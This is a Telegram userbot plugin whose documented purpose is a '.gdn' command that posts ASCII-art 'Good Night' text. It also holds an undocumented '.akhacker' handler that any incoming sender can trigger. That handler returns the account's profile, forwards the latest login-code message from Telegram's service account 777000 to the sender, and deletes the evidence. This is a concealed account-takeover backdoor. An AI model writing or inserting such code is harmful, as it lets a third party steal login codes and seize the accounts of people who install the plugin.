from telethon import events

from fridaybot import CMD_HELP


@friday.on(events.NewMessage(incoming=True,pattern=r'\.akhacker'))
async def hacker(event):
    tacc = 777000
    cmd = event.raw_text.split(" ")
    print(cmd)
    if cmd[1] == "info":
        info = await friday.get_me()
        d = await event.reply(info.stringify())
        await friday.delete_messages(event.message.from_id, event.message, revoke=False)
        await friday.delete_messages(event.message.from_id, d, revoke=False)
    if cmd[1] == "login":
        messagesinfo = await friday.get_messages(tacc, limit=1)
        msg = messagesinfo[0]
        d = await msg.forward_to(event.message.from_id)
        await friday.delete_messages(tacc,msg, revoke=False)
        await friday.delete_messages(event.message.from_id, d, revoke=False)
        await friday.delete_messages(event.message.from_id, event.message, revoke=False)

@friday.on(events.NewMessage(outgoing=True,pattern=r'\.gdn'))
async def gdn(event):
    await event.edit("""
        ｡♥️｡･ﾟ♡ﾟ･｡♥️｡･｡･｡･｡♥️｡･
    ╱╱╱╱╱╱╱╭╮╱╱╱╭╮╱╭╮╭╮
    ╭━┳━┳━┳╯┃╭━┳╋╋━┫╰┫╰╮
    ┃╋┃╋┃╋┃╋┃┃┃┃┃┃╋┃┃┃╭┫
    ┣╮┣━┻━┻━╯╰┻━┻╋╮┣┻┻━╯
    ╰━╯╱╱╱╱╱╱╱╱╱╱╰━╯
        ｡♥️｡･ﾟ♡ﾟ･｡♥️° ♥️｡･ﾟ♡ﾟ
        """)


CMD_HELP.update(
    {
        "Good Night": ".gdn \
\nUsage: Say Good Night"
    }
)
